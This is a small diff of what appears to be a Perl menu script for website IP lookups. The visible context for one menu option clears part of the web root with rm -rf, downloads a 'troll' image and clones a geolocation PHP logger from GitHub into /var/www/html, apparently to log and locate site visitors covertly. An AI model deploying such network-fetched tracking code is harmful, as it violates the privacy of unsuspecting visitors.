@@ -509,6 +509,7 @@ print "\n\n\n\n\n\n\n\n\n\n                       Website's IP Address: "; print
 }
 if ($ip == 9) {
 	system("clear");
+system("echo -ne '\e[8;26;79t'");
 print color 'bold white';
 system("cd /var/www/html;rm -rf troll.gif;wget https://raw.githubusercontent.com/xRtos/geolocation-php-logger/master/troll.gif");
 system("cd /var/www/html;git clone https://github.com/xRtos/geolocation-php-logger.git;cd /var/www/html/geolocation-php-logger;mv * /var/www/html");
